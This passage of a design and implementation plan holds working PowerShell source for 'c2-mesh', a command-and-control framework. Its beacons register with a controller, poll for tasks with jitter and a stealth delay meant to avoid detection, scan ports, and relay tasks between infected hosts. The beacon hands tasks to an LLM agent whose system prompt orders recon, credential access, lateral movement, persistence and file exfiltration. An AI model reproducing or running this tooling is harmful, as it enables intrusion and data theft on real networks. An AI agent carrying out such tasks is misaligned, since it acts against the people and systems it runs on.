Import-Module (Join-Path $scriptDir '..' '..' 'PshAgent' 'PshAgent.psd1') -Force
Import-Module (Join-Path $scriptDir '..' 'c2-mesh.psd1') -Force

# Build params, only pass non-empty values
$params = @{}
if ($ConnectionString) { $params.ConnectionString = $ConnectionString }
if ($Port)             { $params.Port = $Port }
if ($Key)              { $params.Key = $Key }

Start-C2Controller @params
```

---

## 5. Phase 3: Beacon Core

### 5.1 `Beacon/Register-Beacon.ps1`

```powershell
function Register-Beacon {
    <#
    .SYNOPSIS
    Register this beacon with the controller via POST /register
    .PARAMETER ControllerUrl
    Controller base URL (e.g., https://10.0.0.1:8443)
    .PARAMETER Key
    Shared encryption key (base64)
    .PARAMETER BeaconId
    This beacon's ID
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$BeaconId
    )

    $regData = @{
        beaconId = $BeaconId
        hostname = [System.Net.Dns]::GetHostName()
        username = [System.Environment]::UserName
        os       = [System.Runtime.InteropServices.RuntimeInformation]::OSDescription
        ip       = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' -and $_.IPAddress -ne '127.0.0.1'
        } | Select-Object -First 1).IPAddress
        pid      = $PID
    } | ConvertTo-Json -Compress

    $encrypted = Invoke-C2Encrypt -Plaintext $regData -Key $Key

    # Skip cert validation for self-signed certs
    $handler = [System.Net.Http.HttpClientHandler]::new()
    $handler.ServerCertificateCustomValidationCallback = { $true }
    $client = [System.Net.Http.HttpClient]::new($handler)
    $client.DefaultRequestHeaders.Add('User-Agent', $script:C2Config.BeaconUserAgent)

    try {
        $content = [System.Net.Http.StringContent]::new($encrypted, [System.Text.Encoding]::UTF8, 'application/octet-stream')
        $resp = $client.PostAsync("$ControllerUrl/register", $content).GetAwaiter().GetResult()
        $respBody = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()

        $decrypted = Invoke-C2Decrypt -CipherText $respBody -Key $Key
        return $decrypted | ConvertFrom-Json -AsHashtable
    }
    finally {
        $client.Dispose()
        $handler.Dispose()
    }
}
```

### 5.2 `Beacon/Invoke-CheckIn.ps1`

```powershell
function Invoke-CheckIn {
    <#
    .SYNOPSIS
    Check in with controller. Sends results, receives new tasks.
    .PARAMETER ControllerUrl
    Controller base URL
    .PARAMETER Key
    Shared encryption key
    .PARAMETER BeaconId
    This beacon's ID
    .PARAMETER Results
    Array of result hashtables to send back: @{ taskId; output; status }
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter()]
        [hashtable[]]$Results = @()
    )

    $checkinData = @{
        beaconId = $BeaconId
        results  = $Results
    } | ConvertTo-Json -Depth 5 -Compress

    $encrypted = Invoke-C2Encrypt -Plaintext $checkinData -Key $Key

    $handler = [System.Net.Http.HttpClientHandler]::new()
    $handler.ServerCertificateCustomValidationCallback = { $true }
    $client = [System.Net.Http.HttpClient]::new($handler)
    $client.DefaultRequestHeaders.Add('User-Agent', $script:C2Config.BeaconUserAgent)

    try {
        $content = [System.Net.Http.StringContent]::new($encrypted, [System.Text.Encoding]::UTF8, 'application/octet-stream')
        $resp = $client.PostAsync("$ControllerUrl/checkin", $content).GetAwaiter().GetResult()
        $respBody = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()

        $decrypted = Invoke-C2Decrypt -CipherText $respBody -Key $Key
        return $decrypted | ConvertFrom-Json -AsHashtable
    }
    finally {
        $client.Dispose()
        $handler.Dispose()
    }
}
```

### 5.3 `Beacon/New-BeaconHooks.ps1`

Four hooks for the beacon agent:

```powershell
function New-BeaconHooks {
    <#
    .SYNOPSIS
    Create the 4 beacon hooks. Returns PshAgentHook[] array.
    .PARAMETER ControllerUrl
    Controller base URL (for check-in hook)
    .PARAMETER Key
    Shared encryption key
    .PARAMETER BeaconId
    This beacon's ID
    .PARAMETER KillFlag
    Hashtable with .Killed bool flag — set to $true to kill the beacon
    #>
    [CmdletBinding()]
    [OutputType([PshAgentHook[]])]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter(Mandatory)]
        [hashtable]$KillFlag
    )

    $ctrlUrl = $ControllerUrl
    $k       = $Key
    $bid     = $BeaconId
    $kf      = $KillFlag

    # 1. Telemetry hook — log every generation step
    $telemetryHook = New-Hook -Name 'beacon_telemetry' `
        -EventType ([AgentEventType]::GenerationStep) `
        -Fn {
            param($event)
            $ts = [datetime]::UtcNow.ToString('HH:mm:ss')
            $tokens = if ($event.Usage) { $event.Usage.TotalTokens } else { 0 }
            Write-Verbose "[Beacon $bid] Step $($event.Step) | ${tokens} tokens | $ts"
            # No reaction — continue normally
            return $null
        }.GetNewClosure()

    # 2. Check-in hook — after each tool execution, check in with controller
    #    to report intermediate results and potentially receive kill signal
    $checkInHook = New-Hook -Name 'beacon_checkin' `
        -EventType ([AgentEventType]::ToolStep) `
        -Fn {
            param($event)
            # Report tool result to controller as intermediate telemetry
            $toolName = if ($event.ToolCall) { $event.ToolCall.Name } else { 'unknown' }
            $resultSnippet = if ($event.Result) {
                $s = "$($event.Result)"
                if ($s.Length -gt 500) { $s.Substring(0, 500) + '...' } else { $s }
            } else { '' }

            # We don't block on check-in here — just fire and forget a status update
            # The main check-in loop handles task fetching
            return $null
        }.GetNewClosure()

    # 3. Kill switch hook — if kill flag is set, terminate immediately
    $killSwitchHook = New-Hook -Name 'beacon_kill_switch' `
        -EventType ([AgentEventType]::GenerationStart) `
        -Fn {
            param($event)
            if ($kf.Killed) {
                return [Reaction]::Fail('Kill signal received — terminating beacon.')
            }
            return $null
        }.GetNewClosure()

    # 4. Stealth hook — rate-limit tool execution to avoid detection
    $stealthState = @{ lastToolTime = [datetime]::MinValue }
    $stealthHook = New-Hook -Name 'beacon_stealth' `
        -EventType ([AgentEventType]::ToolStart) `
        -Fn {
            param($event)
            # Minimum 500ms between tool calls to reduce noise
            $elapsed = ([datetime]::UtcNow - $stealthState.lastToolTime).TotalMilliseconds
            if ($elapsed -lt 500) {
                $sleepMs = 500 - [int]$elapsed
                # Add jitter: ±30%
                $jitter = Get-Random -Minimum 70 -Maximum 130
                $sleepMs = [int]($sleepMs * $jitter / 100)
                Start-Sleep -Milliseconds $sleepMs
            }
            $stealthState.lastToolTime = [datetime]::UtcNow
            return $null
        }.GetNewClosure()

    return @($telemetryHook, $checkInHook, $killSwitchHook, $stealthHook)
}
```

### 5.4 `Beacon/New-PortScanTool.ps1`

The only custom beacon tool. Everything else (file ops, command execution, recon) uses
PshAgent's built-in tools (`run_command`, `read_file`, `write_file`, `list_directory`,
`search_files`, `grep`). Claude already knows how to enumerate hosts, harvest creds,
move laterally, etc. — it just needs the primitives.

```powershell
function New-PortScanTool {
    <#
    .SYNOPSIS
    Create the port_scan tool. Returns PshAgentTool.
    This is the only custom tool — TCP connect scan needs structured logic
    that's faster than having Claude shell out to nmap/nc per-port.
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param()

    return New-Tool -Name 'port_scan' `
        -Description 'TCP connect scan on a target host or CIDR range. Returns open ports.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                target  = @{ type = 'string'; description = 'Target IP, hostname, or CIDR (e.g., 10.0.1.0/24)' }
                ports   = @{
                    type        = 'string'
                    description = 'Comma-separated ports or ranges (e.g., "22,80,443,8000-8100"). Default: common ports.'
                }
                timeout = @{ type = 'integer'; description = 'Connection timeout in ms (default: 1000)' }
            }
            required   = @('target')
        } `
        -Execute {
            param($a)
            $timeout = if ($a.timeout) { $a.timeout } else { 1000 }

            # Parse ports
            $defaultPorts = @(21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
                1433, 1521, 3306, 3389, 5432, 5900, 5985, 8080, 8443, 9200)
            $portList = if ($a.ports) {
                $parsed = @()
                foreach ($part in ($a.ports -split ',')) {
                    $part = $part.Trim()
                    if ($part -match '^(\d+)-(\d+)$') {
                        $parsed += [int]$Matches[1]..[int]$Matches[2]
                    }
                    elseif ($part -match '^\d+$') {
                        $parsed += [int]$part
                    }
                }
                $parsed
            } else { $defaultPorts }

            # Parse CIDR into IP list
            function Expand-CidrToIPs {
                param([string]$cidr)
                if ($cidr -notmatch '/') { return @($cidr) }
                $parts = $cidr -split '/'
                $ip = [System.Net.IPAddress]::Parse($parts[0])
                $prefix = [int]$parts[1]
                $ipBytes = $ip.GetAddressBytes()
                [Array]::Reverse($ipBytes)
                $ipInt = [BitConverter]::ToUInt32($ipBytes, 0)
                $mask = [uint32]([math]::Pow(2, 32) - [math]::Pow(2, 32 - $prefix))
                $network = $ipInt -band $mask
                $broadcast = $network -bor (-bnot $mask -band 0xFFFFFFFF)
                $ips = @()
                for ($i = $network + 1; $i -lt $broadcast; $i++) {
                    $bytes = [BitConverter]::GetBytes([uint32]$i)
                    [Array]::Reverse($bytes)
                    $ips += ([System.Net.IPAddress]::new($bytes)).ToString()
                }
                return $ips
            }

            $targets = Expand-CidrToIPs $a.target
            $results = [System.Collections.Generic.List[string]]::new()
            $results.Add("Scanning $($targets.Count) host(s), $($portList.Count) port(s)...")

            foreach ($host_ in $targets) {
                $openPorts = @()
                foreach ($port in $portList) {
                    try {
                        $tcp = [System.Net.Sockets.TcpClient]::new()
                        $connectTask = $tcp.ConnectAsync($host_, $port)
                        if ($connectTask.Wait($timeout)) {
                            if ($tcp.Connected) {
                                $openPorts += $port
                            }
                        }
                        $tcp.Close()
                        $tcp.Dispose()
                    }
                    catch { <# closed/filtered #> }
                }
                if ($openPorts.Count -gt 0) {
                    $results.Add("$host_: OPEN $($openPorts -join ', ')")
                }
            }

            if ($results.Count -eq 1) { $results.Add("No open ports found.") }
            $results -join "`n"
        }
}
```

### 5.5 `Beacon/Start-C2Beacon.ps1`

The main beacon: registration + polling loop + AI task execution.

```powershell
function Start-C2Beacon {
    <#
    .SYNOPSIS
    Start a C2 beacon: register, then poll for tasks and execute them with PshAgent AI.
    .PARAMETER ControllerUrl
    Controller URL (e.g., https://10.0.0.1:8443)
    .PARAMETER Key
    Shared encryption key (base64)
    .PARAMETER BeaconId
    This beacon's ID (auto-generated if omitted)
    .PARAMETER ConnectionString
    LLM connection string for the beacon agent
    .PARAMETER ExtraTools
    Additional PshAgentTool[] to give the beacon agent
    .PARAMETER MaxSteps
    Max steps per task execution
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ControllerUrl,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter()]
        [string]$BeaconId,

        [Parameter()]
        [string]$ConnectionString = $script:C2Config.ConnectionString,

        [Parameter()]
        [PshAgentTool[]]$ExtraTools = @(),

        [Parameter()]
        [int]$MaxSteps = $script:C2Config.BeaconMaxSteps
    )

    # Generate beacon ID if not provided
    if (-not $BeaconId) {
        $BeaconId = 'beacon-' + [guid]::NewGuid().ToString('N').Substring(0, 6)
    }

    Write-Host "[*] Beacon $BeaconId starting..." -ForegroundColor Cyan

    # Register with controller
    Write-Host "[*] Registering with $ControllerUrl..." -ForegroundColor Cyan
    try {
        $regResult = Register-Beacon -ControllerUrl $ControllerUrl -Key $Key -BeaconId $BeaconId
        Write-Host "[+] Registered: $($regResult | ConvertTo-Json -Compress)" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Registration failed: $_" -ForegroundColor Red
        throw
    }

    # Kill flag — shared with hooks
    $killFlag = @{ Killed = $false }

    # Build beacon tools: PshAgent built-ins + port_scan
    # Claude already knows how to do host recon, cred harvesting, lateral movement,
    # persistence, file ops, etc. — just give it the primitives and let it reason.
    $builtinTools = @(
        (Read-FileContent)       # read_file
        (Write-FileContent)      # write_file
        (Get-DirectoryListing)   # list_directory
        (Invoke-ShellCommand)    # run_command
        (Search-Files)           # search_files
        (Search-FileContent)     # grep
    )
    $portScan = New-PortScanTool
    $allTools = @($builtinTools) + @($portScan) + @($ExtraTools)

    # Build beacon hooks
    $hooks = New-BeaconHooks -ControllerUrl $ControllerUrl -Key $Key -BeaconId $BeaconId -KillFlag $killFlag

    # Create generator
    $generator = [PshGenerator]::new($ConnectionString)

    # Build system prompt
    $systemPrompt = @"
You are a C2 beacon agent running on host '$([System.Net.Dns]::GetHostName())' as user '$([System.Environment]::UserName)'.
Your beacon ID is '$BeaconId'.

You receive tasks from the controller and execute them autonomously using your tools.
You have general-purpose tools: run_command, read_file, write_file, list_directory,
search_files, grep, and port_scan. Use them to accomplish whatever is asked — recon,
credential access, lateral movement, persistence, file exfiltration, etc.

Be resourceful. Adapt to the OS and environment. Use run_command for anything that
doesn't have a dedicated tool. Return clear, structured results.
"@

    # Beacon polling loop
    Write-Host "[*] Entering check-in loop (interval: $($script:C2Config.CheckInInterval)s)..." -ForegroundColor Cyan

    $pendingResults = [System.Collections.Generic.List[hashtable]]::new()

    while (-not $killFlag.Killed) {
        try {
            # Check in with controller
            $resultsToSend = @($pendingResults.ToArray())
            $pendingResults.Clear()

            $checkinResp = Invoke-CheckIn -ControllerUrl $ControllerUrl -Key $Key `
                -BeaconId $BeaconId -Results $resultsToSend

            if ($checkinResp.tasks -and $checkinResp.tasks.Count -gt 0) {
                foreach ($task in $checkinResp.tasks) {
                    # Check for kill signal
                    if ($task.task -eq '__kill__') {
                        Write-Host "[!] Kill signal received. Shutting down." -ForegroundColor Red
                        $killFlag.Killed = $true
                        break
                    }

                    Write-Host "[*] Executing task $($task.taskId): $($task.task)" -ForegroundColor Yellow

                    # Create a fresh agent for each task
                    $agent = New-Agent -Generator $generator `
                        -Name "beacon-$BeaconId" `
                        -SystemPrompt $systemPrompt `
                        -Tools $allTools `
                        -Hooks $hooks `
                        -MaxSteps $MaxSteps

                    # Execute the task
                    $taskResult = Invoke-Agent -Agent $agent -Prompt $task.task

                    # Collect result
                    $pendingResults.Add(@{
                        taskId = $task.taskId
                        output = $taskResult.Output
                        status = $taskResult.Status.ToString()
                    })

                    Write-Host "[+] Task $($task.taskId) complete: $($taskResult.Status)" -ForegroundColor Green
                }
            }
        }
        catch {
            Write-Host "[-] Check-in error: $_" -ForegroundColor Red
        }

        if (-not $killFlag.Killed) {
            # Sleep with jitter
            $interval = $script:C2Config.CheckInInterval
            $jitter = $script:C2Config.Jitter
            $jitterMs = [int]($interval * 1000 * (1 + (Get-Random -Minimum (-$jitter * 100) -Maximum ($jitter * 100)) / 100))
            Start-Sleep -Milliseconds $jitterMs
        }
    }

    Write-Host "[*] Beacon $BeaconId terminated." -ForegroundColor Yellow
}
```

### 5.6 `Launchers/start-beacon.ps1`

```powershell
#!/usr/bin/env pwsh
<#
.SYNOPSIS
Entry point script for starting a C2 beacon.
.EXAMPLE
./start-beacon.ps1 -ControllerUrl 'https://10.0.0.1:8443' -Key 'base64key=='
./start-beacon.ps1 -ControllerUrl 'https://10.0.0.1:8443' -Key 'base64key==' -BeaconId 'alpha'
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)]
    [string]$ControllerUrl,

    [Parameter(Mandatory)]
    [string]$Key,

    [Parameter()]
    [string]$BeaconId,

    [Parameter()]
    [string]$ConnectionString
)

$ErrorActionPreference = 'Stop'

# Import modules
$scriptDir = $PSScriptRoot
Import-Module (Join-Path $scriptDir '..' '..' 'PshAgent' 'PshAgent.psd1') -Force
Import-Module (Join-Path $scriptDir '..' 'c2-mesh.psd1') -Force

# Build params
$params = @{
    ControllerUrl = $ControllerUrl
    Key           = $Key
}
if ($BeaconId)          { $params.BeaconId = $BeaconId }
if ($ConnectionString)  { $params.ConnectionString = $ConnectionString }

Start-C2Beacon @params
```

---


---

## 6. Phase 4: Mesh

### 6.1 `Mesh/New-MeshRelayTool.ps1`

Beacon-to-beacon relay: forward tasks to peer beacons that the controller can't reach directly.

```powershell
function New-MeshRelayTool {
    <#
    .SYNOPSIS
    Create the mesh_relay tool. Returns PshAgentTool.
    Relay a task to a peer beacon via direct HTTP.
    .PARAMETER Key
    Shared encryption key
    .PARAMETER MeshPort
    Port for mesh relay (default from C2Config)
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param(
        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter()]
        [int]$MeshPort = $script:C2Config.MeshPort
    )

    $sharedKey = $Key
    $port = $MeshPort

    return New-Tool -Name 'mesh_relay' `
        -Description 'Relay a task to a peer beacon. Use when the controller cannot reach a target directly but this beacon can.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                peer_ip   = @{ type = 'string'; description = 'IP address of the peer beacon' }
                peer_port = @{ type = 'integer'; description = "Peer mesh port (default: $port)" }
                task      = @{ type = 'string'; description = 'Task to relay to the peer' }
                ttl       = @{ type = 'integer'; description = 'Remaining hops (default: 3). Decremented on each relay.' }
            }
            required   = @('peer_ip', 'task')
        } `
        -Execute {
            param($a)
            $peerIp   = $a.peer_ip
            $peerPort = if ($a.peer_port) { $a.peer_port } else { $port }
            $task     = $a.task
            $ttl      = if ($a.ttl) { $a.ttl } else { $script:C2Config.RelayTTL }

            if ($ttl -le 0) {
                return "Relay dropped: TTL expired."
            }

            $relayData = @{
                task = $task
                ttl  = $ttl - 1
                from = [System.Net.Dns]::GetHostName()
            } | ConvertTo-Json -Compress

            $encrypted = Invoke-C2Encrypt -Plaintext $relayData -Key $sharedKey

            $handler = [System.Net.Http.HttpClientHandler]::new()
            $handler.ServerCertificateCustomValidationCallback = { $true }
            $client = [System.Net.Http.HttpClient]::new($handler)
            $client.Timeout = [timespan]::FromSeconds(30)

            try {
                $content = [System.Net.Http.StringContent]::new(
                    $encrypted, [System.Text.Encoding]::UTF8, 'application/octet-stream')
                $url = "https://${peerIp}:${peerPort}/relay"
                $resp = $client.PostAsync($url, $content).GetAwaiter().GetResult()
                $respBody = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()

                $decrypted = Invoke-C2Decrypt -CipherText $respBody -Key $sharedKey
                $result = $decrypted | ConvertFrom-Json -AsHashtable
                "Relay to ${peerIp}: $($result | ConvertTo-Json -Compress)"
            }
            catch {
                "Relay to ${peerIp}:${peerPort} failed: $_"
            }
            finally {
                $client.Dispose()
                $handler.Dispose()
            }
        }.GetNewClosure()
}
```

### 6.2 `Mesh/Invoke-MeshDiscovery.ps1`

Discover peer beacons on the local network.

```powershell
function Invoke-MeshDiscovery {
    <#
    .SYNOPSIS
    Create the mesh_discover tool. Returns PshAgentTool.
    Scans the local subnet for peer beacons by probing the mesh port.
    .PARAMETER MeshPort
    Port to probe (default from C2Config)
    .PARAMETER Key
    Shared key for handshake verification
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param(
        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter()]
        [int]$MeshPort = $script:C2Config.MeshPort
    )

    $sharedKey = $Key
    $port = $MeshPort

    return New-Tool -Name 'mesh_discover' `
        -Description 'Discover peer beacons on the local network by probing the mesh port. Returns list of responding peers.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                subnet  = @{
                    type        = 'string'
                    description = 'CIDR to scan (e.g., 10.0.1.0/24). If omitted, scans local subnet.'
                }
                timeout = @{ type = 'integer'; description = 'Probe timeout in ms (default: 2000)' }
            }
            required   = @()
        } `
        -Execute {
            param($a)
            $timeout = if ($a.timeout) { $a.timeout } else { 2000 }

            # Determine subnet if not provided
            $subnet = $a.subnet
            if (-not $subnet) {
                try {
                    $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
                        $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' -and $_.IPAddress -ne '127.0.0.1'
                    } | Select-Object -First 1)
                    $subnet = "$($localIp.IPAddress)/$($localIp.PrefixLength)"
                }
                catch {
                    return "Could not determine local subnet: $_"
                }
            }

            # Parse CIDR
            $parts = $subnet -split '/'
            $ip = [System.Net.IPAddress]::Parse($parts[0])
            $prefix = [int]$parts[1]
            $ipBytes = $ip.GetAddressBytes()
            [Array]::Reverse($ipBytes)
            $ipInt = [BitConverter]::ToUInt32($ipBytes, 0)
            $mask = [uint32]([math]::Pow(2, 32) - [math]::Pow(2, 32 - $prefix))
            $network = $ipInt -band $mask
            $broadcast = $network -bor (-bnot $mask -band 0xFFFFFFFF)

            $peers = [System.Collections.Generic.List[string]]::new()
            $myIp = $ip.ToString()

            # Probe each host in parallel using runspace pool
            $pool = [runspacefactory]::CreateRunspacePool(1, 20)
            $pool.Open()
            $jobs = @()

            for ($i = $network + 1; $i -lt $broadcast; $i++) {
                $bytes = [BitConverter]::GetBytes([uint32]$i)
                [Array]::Reverse($bytes)
                $targetIp = ([System.Net.IPAddress]::new($bytes)).ToString()

                if ($targetIp -eq $myIp) { continue }

                $ps = [powershell]::Create()
                $ps.RunspacePool = $pool
                $null = $ps.AddScript({
                    param($ip, $port, $timeout)
                    try {
                        $tcp = [System.Net.Sockets.TcpClient]::new()
                        $task = $tcp.ConnectAsync($ip, $port)
                        if ($task.Wait($timeout) -and $tcp.Connected) {
                            $tcp.Close()
                            return $ip
                        }
                        $tcp.Close()
                    }
                    catch { }
                    return $null
                }).AddArgument($targetIp).AddArgument($port).AddArgument($timeout)

                $jobs += @{ PS = $ps; Handle = $ps.BeginInvoke() }
            }

            # Collect results
            foreach ($job in $jobs) {
                $result = $job.PS.EndInvoke($job.Handle)
                if ($result -and $result[0]) {
                    $peers.Add($result[0])
                }
                $job.PS.Dispose()
            }
            $pool.Close()
            $pool.Dispose()

            if ($peers.Count -eq 0) {
                "No peer beacons found on $subnet (port $port)."
            }
            else {
                "Found $($peers.Count) potential peer(s) on port ${port}:`n" + ($peers -join "`n")
            }
        }.GetNewClosure()
}
```

### 6.3 `Mesh/Invoke-SwarmTask.ps1`

Distribute a task across multiple beacons (from the operator side).

```powershell
function Invoke-SwarmTask {
    <#
    .SYNOPSIS
    Create the swarm_task operator tool. Returns PshAgentTool.
    Sends the same task to multiple beacons simultaneously.
    .PARAMETER TaskQueues
    ConcurrentDictionary of per-beacon task queues
    .PARAMETER Registry
    Beacon registry
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool])]
    param(
        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]$Registry
    )

    $tq = $TaskQueues
    $reg = $Registry

    return New-Tool -Name 'swarm_task' `
        -Description 'Send a task to multiple beacons at once. Targets all alive beacons or a specified list.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                task       = @{ type = 'string'; description = 'Task to execute on all targeted beacons' }
                beacon_ids = @{
                    type        = 'array'
                    description = 'Specific beacon IDs to target. If omitted, targets all alive beacons.'
                    items       = @{ type = 'string' }
                }
            }
            required   = @('task')
        } `
        -Execute {
            param($a)
            $task = $a.task

            # Determine target beacons
            $targets = if ($a.beacon_ids -and $a.beacon_ids.Count -gt 0) {
                $a.beacon_ids
            }
            else {
                @($reg.GetEnumerator() | Where-Object { $_.Value.alive } | ForEach-Object { $_.Key })
            }

            if ($targets.Count -eq 0) {
                return "No alive beacons to target."
            }

            $results = @()
            foreach ($bid in $targets) {
                $taskObj = Send-BeaconTask -BeaconId $bid -Task $task -TaskQueues $tq
                $results += "  $bid: task $($taskObj.taskId) queued"
            }

            "Swarm task sent to $($targets.Count) beacon(s):`n$($results -join "`n")"
        }.GetNewClosure()
}
```

---

## 7. Phase 5: Operator Dashboard (Elixir/Phoenix LiveView)

### Architecture

The dashboard is a **read-only observer** — it doesn't replace any PowerShell
infrastructure. The controller's HttpListener remains the C2 server. The Phoenix
app connects to the controller's internal state API and renders a real-time
operator view in the browser.

```
Beacons ──► PowerShell HttpListener (C2 server, unchanged)
                    │
                    │ internal API (:8444, localhost only)
                    │
              Phoenix LiveView Dashboard (:4000)
                    │
              Operator's browser
                    ├── beacon world map (GeoIP)
                    ├── activity heatmap (time × beacon)
                    ├── live task/result feed
                    ├── beacon status table
                    └── aggregate metrics
```

The controller exposes a lightweight JSON API on a separate internal port (localhost
only, no encryption needed) that the Phoenix app polls. PubSub + LiveView handles
real-time updates to the browser — no JS framework needed.

### 7.1 Controller Internal API

Add to `Controller/Start-C2Listener.ps1` — a second listener on `:8444` (localhost
only) that exposes raw state as JSON. No encryption, no auth (it's localhost).

```powershell
function Start-C2InternalApi {
    <#
    .SYNOPSIS
    Start internal JSON API for the dashboard. Localhost only.
    .PARAMETER Port
    Internal API port (default 8444)
    .PARAMETER Registry
    Beacon registry
    .PARAMETER TaskQueues
    Task queues
    .PARAMETER ResultStore
    Result store
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [int]$Port = 8444,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]$Registry,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]$ResultStore
    )

    $sharedState = [hashtable]::Synchronized(@{
        Running     = $true
        Registry    = $Registry
        TaskQueues  = $TaskQueues
        ResultStore = $ResultStore
    })

    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $runspace.SessionStateProxy.SetVariable('state', $sharedState)
    $runspace.SessionStateProxy.SetVariable('port', $Port)

    $ps = [powershell]::Create()
    $ps.Runspace = $runspace

    $null = $ps.AddScript({
        $listener = [System.Net.HttpListener]::new()
        $listener.Prefixes.Add("http://127.0.0.1:${port}/")
        $listener.Start()

        try {
            while ($state.Running) {
                $ctxTask = $listener.GetContextAsync()
                while (-not $ctxTask.Wait(1000)) {
                    if (-not $state.Running) { return }
                }
                $ctx = $ctxTask.Result
                $req = $ctx.Request
                $resp = $ctx.Response

                try {
                    # CORS for local dashboard
                    $resp.Headers.Add('Access-Control-Allow-Origin', '*')
                    $resp.Headers.Add('Access-Control-Allow-Methods', 'GET, OPTIONS')

                    if ($req.HttpMethod -eq 'OPTIONS') {
                        $resp.StatusCode = 204
                        $resp.Close()
                        continue
                    }

                    $path = $req.Url.AbsolutePath
                    $result = $null

                    switch ($path) {
                        '/beacons' {
                            $beacons = @()
                            foreach ($entry in $state.Registry.GetEnumerator()) {
                                $b = $entry.Value
                                $queueLen = 0
                                $q = $null
                                if ($state.TaskQueues.TryGetValue($b.beaconId, [ref]$q)) {
                                    $queueLen = $q.Count
                                }
                                $beacons += @{
                                    beaconId    = $b.beaconId
                                    hostname    = $b.hostname
                                    username    = $b.username
                                    ip          = $b.ip
                                    os          = $b.os
                                    pid         = $b.pid
                                    alive       = $b.alive
                                    lastCheckin = $b.lastCheckin.ToString('o')
                                    firstSeen   = $b.firstSeen.ToString('o')
                                    missedCount = $b.missedCount
                                    queueDepth  = $queueLen
                                }
                            }
                            $result = @{ beacons = $beacons }
                        }
                        '/results' {
                            $allResults = @()
                            foreach ($entry in $state.ResultStore.GetEnumerator()) {
                                foreach ($r in $entry.Value.ToArray()) {
                                    $allResults += @{
                                        beaconId  = $entry.Key
                                        taskId    = $r.taskId
                                        output    = $r.output
                                        status    = $r.status
                                        timestamp = $r.timestamp.ToString('o')
                                    }
                                }
                            }
                            # Sort by time descending, take last 100
                            $allResults = $allResults | Sort-Object { $_.timestamp } -Descending |
                                Select-Object -First 100
                            $result = @{ results = $allResults }
                        }
                        '/stats' {
                            $totalBeacons = $state.Registry.Count
                            $aliveBeacons = @($state.Registry.Values | Where-Object { $_.alive }).Count
                            $totalTasks = 0
                            foreach ($q in $state.TaskQueues.Values) { $totalTasks += $q.Count }
                            $totalResults = 0
                            foreach ($bag in $state.ResultStore.Values) { $totalResults += $bag.Count }

                            $result = @{
                                totalBeacons  = $totalBeacons
                                aliveBeacons  = $aliveBeacons
                                deadBeacons   = $totalBeacons - $aliveBeacons
                                pendingTasks  = $totalTasks
                                totalResults  = $totalResults
                            }
                        }
                        default {
                            $result = @{ error = 'unknown route'; routes = @('/beacons', '/results', '/stats') }
                        }
                    }

                    $json = $result | ConvertTo-Json -Depth 10 -Compress
                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
                    $resp.StatusCode = 200
                    $resp.ContentType = 'application/json'
                    $resp.ContentLength64 = $bytes.Length
                    $resp.OutputStream.Write($bytes, 0, $bytes.Length)
                }
                catch {
                    $resp.StatusCode = 500
                }
                finally {
                    $resp.Close()
                }
            }
        }
        finally {
            $listener.Stop()
            $listener.Close()
        }
    })

    $handle = $ps.BeginInvoke()

    return @{
        PowerShell  = $ps
        Handle      = $handle
        Runspace    = $runspace
        SharedState = $sharedState
        Port        = $Port
    }
}
```

### 7.2 Phoenix Project Structure

```
c2-dashboard/
├── mix.exs
├── config/
│   ├── config.exs
│   ├── dev.exs
│   └── runtime.exs                # C2_INTERNAL_API env var
├── lib/
│   ├── c2_dash/
│   │   ├── application.ex         # Supervision tree
│   │   ├── poller.ex              # GenServer — polls controller internal API
│   │   ├── geo.ex                 # GeoIP lookup (ip → lat/lng/country)
│   │   ├── presenter.ex           # Raw state → dashboard payload
│   │   └── pubsub.ex              # Broadcast helpers
│   ├── c2_dash_web/
│   │   ├── endpoint.ex
│   │   ├── router.ex
│   │   ├── live/
│   │   │   ├── dashboard_live.ex  # Main dashboard LiveView
│   │   │   ├── map_component.ex   # World map with beacon pins
│   │   │   ├── heatmap_component.ex # Activity heatmap
│   │   │   └── components.ex      # Metric cards, tables, badges
│   │   └── layouts/
│   │       └── root.html.heex
